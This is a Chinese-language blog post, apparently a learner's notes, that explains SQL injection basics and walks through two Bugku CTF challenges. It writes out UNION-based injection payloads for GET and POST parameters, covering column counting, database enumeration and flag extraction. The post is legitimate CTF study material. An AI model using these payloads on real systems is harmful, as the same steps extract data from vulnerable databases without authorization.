远方的人属于远方

远方属于远方的人


这几天在B站上看crow师傅的教程学习，感觉收益真的是很大，师傅讲的非常详细，每个语句都拆分开来讲解，而且又不厌其烦的一遍又一遍的手动全过程敲一遍命令讲解，每一步都很细致，总之，非常推荐大家去学习一下φ(≧ω≦*)♪

下面先来总结一下sql的基础语句，sql注入门类众多，复杂，但是关键语句就只在这四句：

查库：select schema_name from information_schema.schemata;查表：select table_name from information_schema.tables where table_schema='库名';查列：select column_name from information_schema.columns where table_name='表名';查字段：select 列名 from 库名.表名;

通过这几天的学习，我发现不论是布尔盲注，延时注入，还是显错注入，POST注入，最基本的还是对这四句的使用，所以得记清楚呀<(￣ˇ￣)/

好了下面来看一下具体的实例吧！



bugku 成绩单



首先点进链接发现一个输入框，使用单引号判断发现注入，下面就尝试判断一下列数，使用以下语句发现回显信息（此处再说明一下，由于这是一个POST注入，所以注释符使用#，’--+‘会由于编码问题而失效）：

1' order by 4#对第四列进行排序，若回显正常，说明第四列存在#异常则说明不存在，这里在输入order by 5之后，发现异常#说明只有4列

之后在尝试寻找有没有回显位，使用以下语句

-1' union select 1,2,3,4 #这里要使用一个不存在的id用于#让后面的回显位信息显示发现2，3，4 均可以回显，这里我选择#使用第4位来显示查询信息

查库：

-1' union select 1,2,3,database()#

查表：

-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='skctf_flag'#

查列：

-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g'#

查字段：

-1' union select 1,2,3,concat(skctf_flag) from skctf_flag.fl4g#

最终得到flag：

具体的思路还是很清晰的，查库名==>查表名==>查列名==>从列中获取字段



bugku 这是一个神奇的登录框

同样点开链接后得到一个登录框，先输入admin，admin尝试登录，发现try again，判断为POST注入，用firefox 插件获取post数据或者也可以使用burpsuite进行抓包获取，得到以下信息

下面开始POST注入，这种注入，其实就是通过了POST传参的方式实现注入

首先还是尝试找注入点，在尝试双引号后发现注入点

先判断列数，发现只有2列

admin_name=1" order by 3# &admin_passwd=admin&submit=GO GO GO#order by 2 未报错

下面尝试寻找回显位,发现1可以回显，所以下面就在1的位置进行查询

admin_name=1" union select 1,2# &admin_passwd=admin&submit=GO GO GO

查库：

admin_name=1" union select database(),2# &admin_passwd=admin&submit=GO GO GO

查表：

admin_name=1" union select (select group_concat(table_name) from information_schema.tables where table_schema='bugkusql1'),2# &admin_passwd=admin&submit=GO GO GO

查列：

admin_name=1" union select (select group_concat(column_name) from information_schema.columns where table_name='flag1'),2# &admin_passwd=admin&submit=GO GO GO

查字段：

admin_name=1" union select (select group_concat(flag1) from bugkusql1.flag1),2# &admin_passwd=admin&submit=GO GO GO
